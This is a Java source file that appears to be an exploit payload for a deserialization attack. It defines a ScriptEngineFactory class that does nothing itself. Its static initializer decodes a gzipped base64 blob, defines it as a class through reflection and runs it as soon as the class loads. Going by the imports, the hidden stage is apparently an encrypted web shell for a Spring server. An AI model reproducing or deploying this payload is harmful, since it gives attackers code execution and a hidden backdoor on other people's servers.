package artsploit;

import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.*;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    static {
        Class aClass = null;
        try {
            aClass = defineClass("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");
            aClass.newInstance();

        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public AwesomeScriptEngineFactory() {
        try {
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Class defineClass(String classByte) throws NoSuchMethodException, IOException, InvocationTargetException, IllegalAccessException {
        ClassLoader classLoader = (ClassLoader) Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",new Class[] {byte[].class, int.class, int.class});
        defineClass.setAccessible(true);
        byte[] evalBytes = Base64.getDecoder().decode(classByte);
        java.io.ByteArrayInputStream byteInputStream = new java.io.ByteArrayInputStream(evalBytes);
        java.io.ByteArrayOutputStream byteOutputStream = new java.io.ByteArrayOutputStream();
        java.util.zip.GZIPInputStream gzipInputStream = new java.util.zip.GZIPInputStream(byteInputStream);
        byte[] buffer = new byte[1024];
        for (int i=-1;(i=gzipInputStream.read(buffer)) >0;){
            byteOutputStream.write(buffer,0,i);
        }
        byte[] bytes = byteOutputStream.toByteArray();
        return (Class<HttpServlet>) defineClass.invoke(classLoader, new Object[] {bytes, 0, bytes.length});
    }



    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
